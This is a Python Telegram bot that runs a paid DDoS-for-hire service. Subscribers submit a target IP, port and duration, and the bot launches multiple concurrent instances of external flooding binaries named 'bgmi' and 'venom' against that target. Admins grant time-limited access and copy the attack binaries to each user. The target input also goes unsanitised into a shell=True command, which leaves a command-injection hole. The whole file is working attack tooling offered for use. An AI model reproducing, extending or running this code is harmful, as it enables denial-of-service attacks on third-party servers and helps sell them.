import telebot
import subprocess
import datetime
import os
import time
import json
import shutil
import logging
from telebot import types
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# --- Configuration Loading ---
CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config_data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config_data, f, indent=4)

config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config.get('admin_ids', []))
USER_FILE = config.get('user_file', 'users.json')
LOG_FILE = config.get('log_file', 'bot.log')
admin_balances = config.get('admin_balances', {})

# Binary Paths - FIXED
ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
ORIGINAL_VENOM_PATH = '/root/venom/venom'  # Added missing path

# --- Helper Functions ---
def read_users():
    try:
        if not os.path.exists(USER_FILE): return {}
        with open(USER_FILE, 'r') as f:
            data = json.load(f)
            return {uid: datetime.datetime.fromisoformat(exp) for uid, exp in data.items()}
    except Exception: return {}

def write_users(users_dict):
    with open(USER_FILE, 'w') as f:
        json.dump({uid: exp.isoformat() for uid, exp in users_dict.items()}, f)

allowed_user_ids = read_users()

def is_authorized(user_id):
    return user_id in ADMIN_IDS or str(user_id) in allowed_user_ids

def admin_only(func):
    def wrapper(message):
        if message.from_user.id in ADMIN_IDS:
            return func(message)
        bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
    return wrapper

# --- Shell & Threading Logic ---
def shell_executor(command):
    """Low-level shell execution."""
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def run_attack_process(target, port, duration, b_path, v_path):
    """Spawns multiple threads to maximize shell output."""
    cmd_bgmi = f"{b_path} {target} {port} {duration} 200"
    cmd_venom = f"{v_path} {target} {port} {duration} 200"
    
    # Using ThreadPoolExecutor to launch 5 concurrent shell instances for intensity
    with ThreadPoolExecutor(max_workers=10) as executor:
        for _ in range(5):
            executor.submit(shell_executor, cmd_bgmi)
            executor.submit(shell_executor, cmd_venom)

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('🚀 Attack'), types.KeyboardButton('ℹ️ My Info'))
    bot.send_message(message.chat.id, "🔰 **DDOS BOT READY** 🔰", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def attack_request(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "🎯 **Enter IP, Port, and Duration:**\nExample: `1.1.1.1 80 120`", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_attack)
    else:
        bot.send_message(message.chat.id, "🚫 **Unauthorized!** Purchase a subscription.")

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")
            return
            
        target, port, duration = args[0], args[1], args[2]
        if int(duration) > 240:
            bot.reply_to(message, "❌ Max time is 240s.")
            return

        u_id = str(message.chat.id)
        # Determine paths
        b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
        v_path = ORIGINAL_VENOM_PATH if message.chat.id in ADMIN_IDS else f"./venom{u_id}"

        # Ensure binaries are executable
        for path in [b_path, v_path]:
            if os.path.exists(path):
                os.chmod(path, 0o755)

        # Launch multithreaded attack
        Thread(target=run_attack_process, args=(target, port, duration, b_path, v_path)).start()
        
        bot.send_message(message.chat.id, f"🚀 **Attack Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`", parse_mode="Markdown")
    except Exception:
        bot.reply_to(message, "⚠️ **Error processing attack.**")

@bot.message_handler(commands=['stop'])
@admin_only
def stop_attack(message):
    """Instantly kills all processes related to the attack binaries."""
    try:
        # Kills any process that has 'soul' or 'venom' in the name
        subprocess.run("pkill -9 -f soul", shell=True)
        subprocess.run("pkill -9 -f venom", shell=True)
        bot.reply_to(message, "🛑 **All attack processes terminated globally.**", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error stopping processes: {e}")

@bot.message_handler(commands=['add'])
@admin_only
def add_user(message):
    args = message.text.split()
    if len(args) == 3:
        user_id, days = args[1], int(args[2])
        expiry = datetime.datetime.now() + datetime.timedelta(days=days)
        allowed_user_ids[user_id] = expiry
        write_users(allowed_user_ids)
        
        # Deploy user-specific binaries
        try:
            shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
            shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
            os.chmod(f'bgmi{user_id}', 0o755)
            os.chmod(f'venom{user_id}', 0o755)
        except Exception:
            pass

        bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
    else:
        bot.reply_to(message, "Usage: `/add <userId> <days>`")

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    u_id = str(message.chat.id)
    role = "Admin" if message.chat.id in ADMIN_IDS else "User"
    expiry = allowed_user_ids.get(u_id, "Lifetime" if role == "Admin" else "No Access")
    
    msg = (f"👤 **Profile Info**\n"
           f"Type: `{role}`\n"
           f"Expiry: `{expiry}`")
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

if __name__ == '__main__':
    print("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            time.sleep(5)
